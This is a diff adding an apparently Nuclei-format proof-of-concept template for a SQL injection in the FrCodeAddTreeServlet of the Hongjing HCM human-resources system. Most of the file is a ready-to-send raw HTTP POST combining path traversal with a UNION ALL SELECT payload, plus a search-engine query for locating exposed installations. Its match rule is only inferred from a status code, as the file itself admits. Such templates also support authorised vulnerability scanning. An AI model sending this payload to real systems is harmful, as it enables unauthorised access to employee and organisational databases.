@@ -1,0 +1,40 @@
+id: poc-d01fa055f4c9c2bc5898
+info:
+  name: 宏景人力资源信息管理系统FrCodeAddTreeServlet存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/d01fa055f4c9c2bc58983992f22dfa8f
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: d01fa055f4c9c2bc58983992f22dfa8f
+    fofa: + hunter`app.name="宏景 HCM"`
+http:
+- raw:
+  - 'POST /templates/attestation/../../servlet/FrCodeAddTreeServlet HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+
+    Content-Length: 157
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Connection: close
+
+
+    params=&issuperuser=&parentid=&privType=&manageprive=&action=&target=&showType=1'' UNION ALL SELECT 111*111,NULL,NULL,NULL,NULL,NULL-- fNwL&treetype=&orgtype='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
